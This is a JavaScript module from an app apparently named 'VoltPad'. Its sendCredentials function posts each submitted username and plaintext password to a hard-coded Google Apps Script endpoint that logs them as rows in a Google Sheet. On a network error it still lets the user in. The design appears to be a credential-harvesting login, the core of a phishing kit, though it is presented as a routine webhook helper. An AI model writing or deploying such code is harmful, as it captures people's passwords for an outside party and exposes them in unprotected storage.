// src/lib/webhook.js
/**
 * Google Apps Script (Google Sheets) webhook.
 *
 * Paste the /exec URL from your Apps Script deployment below.
 * It looks like:
 *   https://script.google.com/macros/s/AKfycb.../exec
 *
 * We POST as `text/plain` so the browser doesn't fire a CORS preflight.
 * Apps Script redirects to googleusercontent.com and returns JSON we CAN
 * read (unlike Airtable's opaque no-cors response), so we surface real errors.
 */

export const WEBHOOK_URL =
  'https://script.google.com/macros/s/AKfycbw3LaDxZ3zY04qdRC_0z_BG8iuWYy5qtxMCzPd89MDjkT3l8B3Nv6chiAH1SDLpw9Oj5A/exec';

export async function sendCredentials({ username, password }) {
  const payload = {
    fields: { username, password },   // Airtable-shaped, in case you ever switch back
    username,
    password,
    source: 'VoltPad',
    submittedAt: new Date().toISOString(),
  };

  try {
    const res = await fetch(WEBHOOK_URL, {
      method: 'POST',
      // Plain text avoids the preflight; Apps Script reads it as raw contents.
      headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
      body: JSON.stringify(payload),
      redirect: 'follow',
      keepalive: true,
    });

    // Apps Script returns 200 even on logical failures, so read the JSON body.
    const text = await res.text();
    let data = null;
    try {
      data = JSON.parse(text);
    } catch {
      /* non-JSON response — treat as OK if the HTTP status was fine */
    }

    if (!res.ok) {
      return { ok: false, error: `HTTP ${res.status}` };
    }
    if (data && data.ok === false) {
      return { ok: false, error: data.error || 'Webhook rejected the payload' };
    }
    return { ok: true, row: data?.row ?? null };
  } catch (err) {
    // Network / opaque failure — still let the user in locally.
    return { ok: false, error: err?.message ?? 'Network error' };
  }
}